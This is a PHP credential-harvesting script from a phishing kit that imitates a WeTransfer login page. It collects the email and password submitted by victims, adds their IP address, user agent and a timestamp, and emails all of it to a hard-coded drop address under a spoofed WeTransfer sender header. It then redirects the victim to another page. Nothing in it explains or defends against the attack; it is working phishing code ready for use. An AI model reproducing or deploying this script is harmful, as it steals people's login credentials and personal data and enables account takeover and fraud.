<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$msg .= "------------------+| WeTransfer |+------------\n";
$msg .= "Email : ".$_POST['id1']."\n";
$msg .= "Password  : ".$_POST['id2']."\n";
$msg .= "------------------+|  PC INFO   |+------------\n";
$msg .= "IP   : $ip \n";
$msg .= "TIME : ".$time."\n";
$msg .= "DATE : ".$date."\n";
$msg .= "USER : ".$userag."\n";
$msg .= "-----------------------------------------------\n";



$bilsnd = "goodlogs1972@gmail.com";
$sub = "Aol Login  | $ip ";
$head = "From: wetransfer@support.com";
$head .= "\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$sub,$msg,$head,$file);



header("Location: log.php");
$css = css_while();
$html = html_while($css, "");
die($html);
?>